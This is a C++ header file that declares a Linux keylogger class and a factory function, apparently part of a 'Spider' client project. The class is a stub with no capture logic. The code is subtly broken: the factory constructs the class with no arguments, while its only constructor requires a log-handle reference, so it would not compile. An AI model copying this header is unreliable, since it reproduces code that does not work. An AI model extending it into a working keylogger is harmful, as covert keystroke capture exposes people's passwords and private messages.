//
// Created by roman sztergbaum on 27/09/2017.
//

#ifndef SPIDER_CLIENT_LINUXKEYLOGGER_HPP
#define SPIDER_CLIENT_LINUXKEYLOGGER_HPP

#include <memory>
#include <utils/Config.hpp>
#include "KeyLogger.hpp"

namespace spi
{
    class LinuxKeyLogger : public KeyLogger
    {
    public:
        explicit LinuxKeyLogger(LogHandle &logHandle) : _logHandle(logHandle)
        {
        };
        virtual ~LinuxKeyLogger() = default;

    private:
        LogHandle &_logHandle;
    };
}

namespace spi::details
{
    static always_inline KeyLogPtr createKeyLogger()
    {
        return std::make_unique<LinuxKeyLogger>();
    }
}

#endif //SPIDER_CLIENT_LINUXKEYLOGGER_HPP
